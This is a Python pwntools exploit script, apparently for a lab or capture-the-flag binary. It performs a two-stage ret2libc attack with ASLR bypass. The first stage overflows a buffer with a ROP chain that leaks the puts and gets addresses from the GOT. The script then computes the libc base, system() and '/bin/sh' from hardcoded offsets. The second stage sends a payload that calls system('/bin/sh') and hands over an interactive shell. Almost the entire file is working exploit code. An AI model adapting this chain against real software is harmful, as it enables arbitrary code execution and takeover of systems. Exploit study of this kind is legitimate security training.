
"""
Author :- Pratham Naik
Date :- 28-10-2023
ExploitType :- ret2libc (ASLR BYPASS)

"""


from pwn import *

elf=context.binary=ELF('./main',checksec=False)

context.log_level = 'error'


################################# Required Gadgets ###############################

pop_rdi=pack(0x00000000004011bb)

################################# STAGE 1 ########################################

payload=cyclic(18)+pop_rdi+pack(elf.got.puts)+pack(elf.plt.puts)
payload+=pop_rdi+pack(elf.got.gets)+pack(elf.plt.puts)+pack(elf.sym.main)

io=process()

io.recvuntil(b"data")

io.recv()

io.sendline(payload)

list_addr=io.recv().split(b"\n")

print(list_addr)

Puts_address=hex(unpack(list_addr[0],'all'))
Gets_address=hex(unpack(list_addr[1],'all'))


print(f"Puts Address {Puts_address}")
print(f"Gets Address {Gets_address}")

#################################################################################




#################################################################################
######################## Leaked Libc Base Address ###############################
#################################################################################

libc_base_addr=hex(int(Puts_address,16)-int(0x0000000000072230))

print(f"Libc Base Address {libc_base_addr}")

#################################################################################
#################################################################################
#################################################################################


#################################################################################
#System Addresss
#################################################################################
system_addr=int(libc_base_addr,16)+int(0x45e50)
print(f"System Address {system_addr}")
#################################################################################



#################################################################################
#bin/sh Address
#################################################################################
bin_sh=int(libc_base_addr,16)+int(0x195152)
print(f"/bin/sh Address {bin_sh}")
#################################################################################





################################ STAGE 2 ########################################

payload2=cyclic(18)+pop_rdi+pack(bin_sh)+pack(system_addr)

print(payload2)

io.sendline(payload2)

io.interactive()

#################################################################################
